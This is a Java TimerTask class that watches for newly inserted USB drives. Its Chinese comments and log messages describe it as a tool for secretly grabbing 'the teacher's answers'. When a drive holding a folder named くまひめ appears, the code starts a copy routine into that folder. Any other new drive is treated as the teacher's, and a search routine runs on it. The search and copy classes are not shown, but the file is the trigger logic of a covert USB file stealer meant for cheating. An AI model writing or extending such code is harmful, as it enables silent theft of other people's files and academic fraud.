package controller;

import java.io.File;
import java.util.TimerTask;

public class timetask extends TimerTask {
	private boolean isNewRoot = false;
	private boolean isToCopy = false;

	@Override
	public void run() {
		File[] parts = File.listRoots();
		if (commondata.getRoots() != null
				&& parts.length > commondata.getRoots().length) {
			for (int i = 0; i < parts.length; i++) {

				isNewRoot = true;
				for (int j = 0; j < commondata.getRoots().length; j++) {
					if (parts[i].getAbsolutePath().equals(
							commondata.getRoots()[j].getAbsolutePath())) {
						isNewRoot = false;
					}
				}
				// 有U盘插入
				if (isNewRoot) {
					// 查询U盘
					isToCopy = false;
					for (int n = 0; n < parts[i].listFiles().length; n++) {
						// 如果你需要复制老师的答案的话，你就得在你的U盘的根目录下创建一个名字为くまひめ的文件夹
						if (parts[i].listFiles()[n].isDirectory()
								&& parts[i].listFiles()[n].getName().equals(
										"くまひめ")) {
							isToCopy = true;
						}
					}
					if (isToCopy) {

						System.out.println("插入U盘目的为复制老师的答案！");
						new copy(parts[i].getAbsolutePath() + "くまひめ\\").start();
					} else {
						System.out.println("老师插入了U盘！");
						new search(parts[i]).start();
					}
				}
			}
		}

		commondata.setRoots(parts);

	}
}
